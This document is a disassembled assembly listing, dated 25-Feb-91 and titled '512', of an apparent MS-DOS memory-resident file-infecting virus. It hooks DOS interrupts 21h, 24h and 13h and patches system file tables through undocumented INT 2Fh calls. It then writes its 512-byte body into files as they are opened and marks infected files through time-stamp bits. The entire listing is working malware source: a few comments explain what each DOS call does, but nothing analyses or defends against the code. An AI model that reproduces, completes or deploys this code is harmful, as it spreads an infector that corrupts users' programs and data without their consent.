

PAGE 60,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             512                                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   25-Feb-91                                            ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e         equ     6Eh                                     ; (0000:006E=9B5h)
data_2e         equ     70h                                     ; (0000:0070=0FF33h)
data_3e         equ     4                                       ; (67CC:0004=0)

codeseg_        segment
                assume  cs:codeseg_, ds:codeseg_


                org     100h

FiveTwelve             proc    far

start:
                mov     ah,30h                                  ; '0'
                int     21h                                     ; DOS Services  ah=function 30h
                                                                ;  get DOS version number ax
                mov     si,4
                mov     ds,si
                cmp     ah,1Eh
                lds     ax,dword ptr [si+8]                     ; Load 32 bit ptr
                jc      loc_1                                   ; Jump if carry Set
                mov     ah,13h
                int     2Fh                                     ; Multiplex/Spooler al=func B1h
                push    ds
                push    dx
                int     2Fh                                     ; Multiplex/Spooler al=func B1h
                pop     ax
                pop     ds
loc_1:
                mov     di,0F8h
                stosw                                           ; Store ax to es:[di]
                mov     ax,ds
                stosw                                           ; Store ax to es:[di]
                mov     ds,si
                lds     ax,dword ptr [si+40h]                   ; Load 32 bit ptr
                stosw                                           ; Store ax to es:[di]
                cmp     ax,121h
                mov     ax,ds
                stosw                                           ; Store ax to es:[di]
                push    es
                push    di
                jnz     loc_2                                   ; Jump if not zero
                shl     si,1                                    ; Shift w/zeros fill
                mov     cx,100h
                repe    cmpsw                                   ; Rept zf=1+cx>0 Cmp [si] to es:[di]
loc_2:
                push    cs
                pop     ds
                jz      loc_3                                   ; Jump if zero
                mov     ah,52h                                  ; 'R'
                int     21h                                     ; DOS Services  ah=function 52h
                push    es
                mov     si,0F8h
                sub     di,di
                les     ax,dword ptr es:[bx+12h]                ; Load 32 bit ptr
                mov     dx,es:[di+2]
                mov     cx,104h
                rep     movsw                                   ; Rep while cx>0 Mov [si] to es:[di]
                mov     ds,cx
                mov     di,16h
                mov     word ptr ds:data_1e[di],121h            ; (0000:006E=9B5h)
                mov     ds:data_2e[di],es                       ; (0000:0070=0FF33h)
                pop     ds
                mov     [bx+14h],dx
                mov     dx,cs
                mov     ds,dx
                mov     bx,[di-14h]
                dec     bh
                mov     es,bx
                cmp     dx,[di]
                mov     ds,[di]
                mov     dx,[di]
                dec     dx
                mov     ds,dx
                mov     si,cx
                mov     dx,di
                mov     cl,8
                rep     movsw                                   ; Rep while cx>0 Mov [si] to es:[di]
                mov     ds,bx
                jc      loc_5                                   ; Jump if carry Set
                int     20h                                     ; Program Terminate
loc_3:
                mov     si,cx
                mov     ds,[si+2Ch]
loc_4:
                lodsw                                           ; String [si] to ax
                dec     si
                test    ax,ax
                jnz     loc_4                                   ; Jump if not zero
                add     si,3
                mov     dx,si
loc_5:
                mov     ah,3Dh                                  ; '='
                call    sub_1
                mov     dx,[di]
                mov     [di+4],dx
                add     [di],cx
                pop     dx
                push    dx
                push    cs
                pop     es
                push    cs
                pop     ds
                push    ds
                mov     al,50h                                  ; 'P'
                push    ax
                mov     ah,3Fh                                  ; '?'
                ret                                             ; Return far

FiveTwelve             endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1           proc    near
                int     21h                                     ; DOS Services  ah=function 3Dh
                                                                ;  open file, al=mode,name@ds:dx
                jc      loc_ret_6                               ; Jump if carry Set
                mov     bx,ax

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_2:
                push    bx
                mov     ax,1220h
                int     2Fh                                     ; Multiplex/Spooler al=func 20h
                mov     bl,es:[di]
                mov     ax,1216h
                int     2Fh                                     ; Multiplex/Spooler al=func 16h
                pop     bx
                push    es
                pop     ds
                add     di,11h
                mov     cx,200h

loc_ret_6:
                ret
sub_1           endp

                db      0FBh, 6, 56h, 57h, 55h, 1Eh
                db      51h, 0E8h, 0DEh, 0FFh, 8Bh, 0E9h
                db      8Bh, 75h, 4, 59h, 1Fh, 0E8h
                db      2Fh, 0, 72h, 26h, 3Bh, 0F5h
                db      73h, 22h, 50h, 26h, 8Ah, 45h
                db      0FCh, 0F6h, 0D0h, 24h, 1Fh, 75h
                db      16h, 26h, 3, 35h, 26h, 87h
                db      75h, 4, 26h, 1, 2Dh, 0E8h
                db      11h, 0, 26h, 89h, 75h, 4

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;
;                       External Entry Point
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

int_24h_entry   proc    far
                lahf                                            ; Load ah from flags
                sub     es:[di],bp
                sahf                                            ; Store ah into flags
loc_7:
                pop     ax
loc_8:
                pop     bp
                pop     di
                pop     si
                pop     es
                ret     2                                       ; Return far
int_24h_entry   endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3           proc    near
                mov     ah,3Fh                                  ; '?'

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_4:
                pushf                                           ; Push flags
                push    cs
                call    sub_5
                ret
sub_3           endp

                db      80h, 0FCh, 3Fh, 74h, 0B0h, 1Eh
                db      6, 50h, 53h, 51h, 52h, 56h
                db      57h, 80h, 0FCh, 3Eh, 74h, 14h
                db      3Dh, 0, 4Bh, 0B4h, 3Dh, 74h
                db      0Fh
loc_9:
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     es
                pop     ds

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5           proc    near
                jmp     dword ptr cs:data_3e                    ; (67CC:0004=0)
                db      0B4h, 45h, 0E8h, 6Ch, 0FFh, 72h
                db      0ECh, 2Bh, 0C0h, 89h, 45h, 4
                db      0C6h, 45h, 0F1h, 2, 0FCh, 8Eh
                db      0D8h, 0BEh, 4Ch, 0, 0ADh, 50h
                db      0ADh, 50h, 0FFh, 74h, 40h, 0FFh
                db      74h, 42h, 2Eh, 0C5h, 54h, 0B0h
                db      0B8h, 13h, 25h, 0CDh, 21h, 0Eh
                db      1Fh, 0BAh, 4, 2, 0B0h, 24h
                db      0CDh, 21h, 6, 1Fh, 8Ah, 45h
                db      0FCh, 24h, 1Fh, 3Ch, 1Fh, 74h
                db      8, 8Bh, 45h, 17h
                db      2Dh, 43h, 4Fh, 75h, 3Fh
loc_10:
                xor     [di-4],al
                mov     ax,[di]
                cmp     ax,cx
                jb      loc_14                                  ; Jump if below
                add     ax,cx
                jc      loc_14                                  ; Jump if carry Set
                test    byte ptr [di-0Dh],4
                jnz     loc_14                                  ; Jump if not zero
                lds     si,dword ptr [di-0Ah]                   ; Load 32 bit ptr
                dec     ax
                shr     ah,1                                    ; Shift w/zeros fill
                and     ah,[si+4]
                jz      loc_14                                  ; Jump if zero
                mov     ax,20h
                mov     ds,ax
                sub     dx,dx
                call    sub_3
                mov     si,dx
                push    cx

locloop_11:
                lodsb                                           ; String [si] to al
                cmp     al,cs:[si+7]
                jne     loc_15                                  ; Jump if not equal
                loop    locloop_11                              ; Loop if cx > 0

                pop     cx
loc_12:
                or      byte ptr es:[di-4],1Fh
loc_13:
                or      byte ptr es:[di-0Bh],40h                ; '@'
loc_14:
                mov     ah,3Eh                                  ; '>'
                call    sub_4
                or      byte ptr es:[di-0Ch],40h                ; '@'
                pop     ds
                pop     dx
                mov     ax,2524h
                int     21h                                     ; DOS Services  ah=function 25h
                                                                ;  set intrpt vector al to ds:dx
                pop     ds
                pop     dx
                mov     al,13h
                int     21h                                     ; DOS Services  ah=function 25h
                                                                ;  set intrpt vector al to ds:dx
                jmp     loc_9
loc_15:
                pop     cx
                mov     si,es:[di]
                mov     es:[di+4],si
                mov     ah,40h                                  ; '@'
                int     21h                                     ; DOS Services  ah=function 40h
                                                                ;  write file cx=bytes, to ds:dx
                jc      loc_13                                  ; Jump if carry Set
                mov     es:[di],si
                mov     es:[di+4],dx
                push    cs
                pop     ds
                mov     dl,8
                mov     ah,40h                                  ; '@'
                int     21h                                     ; DOS Services  ah=function 40h
                                                                ;  write file cx=bytes, to ds:dx
                jmp     short loc_12
sub_5           endp

                db      0CFh, 36h, 36h, 36h

codeseg_        ends

                end     start

